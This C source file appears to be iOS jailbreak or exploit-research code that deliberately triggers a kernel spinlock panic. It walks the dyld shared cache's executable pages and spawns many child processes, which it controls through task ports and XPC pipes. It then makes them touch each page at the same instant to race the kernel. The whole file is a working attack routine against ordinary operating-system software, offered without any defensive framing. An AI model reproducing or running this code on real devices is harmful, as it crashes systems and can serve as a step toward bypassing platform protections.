#include <stdio.h>
#include <poll.h>
#include <litehook.h>
#include <pthread/pthread.h>
#include <sys/mman.h>
#define TARGET_OS_SIMULATOR 0
#include <dyld_cache_format.h>
#include <litehook.h>
#include <spawn.h>
#include <mach-o/dyld.h>
#include <signal.h>

#include <xpc/xpc.h>
#include "xpc_private.h"
extern xpc_object_t xpc_dictionary_create_empty();

#include <os/log.h>

uintptr_t litehook_get_dsc_slide(void);
int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);

char* copy_child_path(void)
{
	uint32_t pathSize = PATH_MAX;
	char path[PATH_MAX];
	_NSGetExecutablePath(path, &pathSize);

	char *lastslash = strrchr(path, '/');
	strlcpy(lastslash, "/spinlock_child", PATH_MAX - (lastslash - path));

	return strdup(path);
}

void dsc_enumerate_text_pages(bool (^enumeratorBlock)(vm_address_t va))
{
	FILE *dscFile = fopen(litehook_locate_dsc(), "rb");
	if (!dscFile) return;

	void (^processCache)(FILE *, struct dyld_cache_header *) = ^(FILE *f, struct dyld_cache_header *h) {
		struct dyld_cache_mapping_info mappingInfos[h->mappingCount];
		fseek(f, h->mappingOffset, SEEK_SET);
		if (fread(mappingInfos, sizeof(struct dyld_cache_mapping_info), h->mappingCount, f) != h->mappingCount) return;

		uintptr_t slide = litehook_get_dsc_slide();
		for (uint32_t i = 0; i < h->mappingCount; i++) {
			if (mappingInfos[i].initProt & PROT_EXEC) {
				for (uint64_t pageAddr = mappingInfos[i].address; pageAddr < mappingInfos[i].address + mappingInfos[i].size; pageAddr += PAGE_SIZE) {
					enumeratorBlock(slide + pageAddr);
				}
			}
		}
	};

	struct dyld_cache_header header;
	if (fread(&header, sizeof(header), 1, dscFile) != 1) { fclose(dscFile); return; };

	processCache(dscFile, &header);

	struct dyld_subcache_entry_v1 subcacheEntries[header.subCacheArrayCount];
	fseek(dscFile, header.subCacheArrayOffset, SEEK_SET);
	if (fread(subcacheEntries, sizeof(struct dyld_subcache_entry_v1), header.subCacheArrayCount, dscFile) != header.subCacheArrayCount) { fclose(dscFile); return; };

	for (uint32_t i = 0; i < header.subCacheArrayCount; i++) {
		char subcachePath[PATH_MAX];
		snprintf(subcachePath, PATH_MAX, "%s.%u", litehook_locate_dsc(), i + 1);
		FILE *f = fopen(subcachePath, "rb");
		if (f) {
			struct dyld_cache_header subcacheHeader;
			if (fread(&subcacheHeader, sizeof(subcacheHeader), 1, f) != 1) continue;
			processCache(f, &subcacheHeader);
			fclose(f);
		}
	}

	fclose(dscFile);
}

bool is_page_resident(const void *ptr)
{
	// I tried adding a check here for whether the page is not resident
	// For some reason the mincore call seems to influence stability of triggering a spinlock panic
	// char vec = 0;
	// mincore((const void *)va, PAGE_SIZE, &vec);
	// return vec != 0;

	// Since I couldn't find a better way, we just bruteforce DSC text pages and hope we find one that's not resident
	return false;
}

struct child_process {
	pid_t pid;
	xpc_object_t pipe;
};

void spawn_child(char *path, bool modifiedAccess, struct child_process *cnp)
{
	const char *arg1 = !modifiedAccess ? "access-original" : "access-modified";
	char* const *envp = !modifiedAccess ? (char* const[]){ "_MSSafeMode=1", NULL } : NULL;

	int r = posix_spawn(&cnp->pid, path, NULL, NULL, (char* const[]){ path, (char *)arg1, NULL }, envp);

	if (r == 0) {
		// wait for child to register server port
		// kinda hacky but I couldn't find any better way

		mach_port_t taskPort = MACH_PORT_NULL;
		task_for_pid(mach_task_self(), cnp->pid, &taskPort);

		mach_port_t *registeredPorts = NULL;
		mach_msg_type_number_t registeredPortsCount = 0;
		do {
			if (registeredPorts) {
				for(mach_msg_type_number_t i = 0; i < registeredPortsCount; ++i)
				{
					mach_port_deallocate(mach_task_self(), registeredPorts[i]);
				}
				vm_deallocate(mach_task_self(), (vm_address_t)registeredPorts, registeredPortsCount * sizeof(mach_port_t));
			}

			mach_ports_lookup(taskPort, &registeredPorts, &registeredPortsCount);
		} while(registeredPorts[2] == MACH_PORT_NULL);

		cnp->pipe = xpc_pipe_create_from_port(registeredPorts[2], 0);
	}	
}

void trigger_spinlock_panic(int procCount, void (^progressBlock)(uint64_t idx, uint64_t cnt))
{
	__block uint64_t pagecnt = 0;
	dsc_enumerate_text_pages(^bool(vm_address_t va) {
		pagecnt++;
		return true;
	});

	struct child_process *childs = malloc(procCount * sizeof(struct child_process));
	char *childPath = copy_child_path();
	
	// Spawn all child processes
	for (int i = 0; i < procCount; i++) {
		bool modifiedAccess = (i % 2) != 0;
		spawn_child(childPath, modifiedAccess, &childs[i]);
	}

	__block uint64_t idx = 0;
	dsc_enumerate_text_pages(^bool(vm_address_t va) {
		// Skip any pages that are already resident
		if (is_page_resident((void *)va)) return true;

		int compipe[2];
		pipe(compipe);

		// Stage the next page to be accessed in every single process
		for (int i = 0; i < procCount; i++) {
			xpc_object_t xdict = xpc_dictionary_create_empty();
			xpc_dictionary_set_uint64(xdict, "pageToAccess", va - litehook_get_dsc_slide());
			xpc_dictionary_set_fd(xdict, "comFd", compipe[0]);

			xpc_object_t xreply;
			int err = xpc_pipe_routine_with_flags(childs[i].pipe, xdict, &xreply, 0);
			xpc_release(xdict);
			if (err == 0) {
				xpc_release(xreply);
			}
		}

		// Make all processes perform the access at the same time
		char msg = 0;
		write(compipe[1], &msg, sizeof(msg));

		close(compipe[0]);
		close(compipe[1]);

		idx++;
		progressBlock(idx, pagecnt);

		return true;
	});

	// If we hit this, the device that this is ran on is not affected by spinlock panics
	// So just exit gracefully and kill the child processes
	for (int i = 0; i < procCount; i++) {
		kill(childs[i].pid, SIGTERM);
	}

	free(childPath);
	free(childs);
}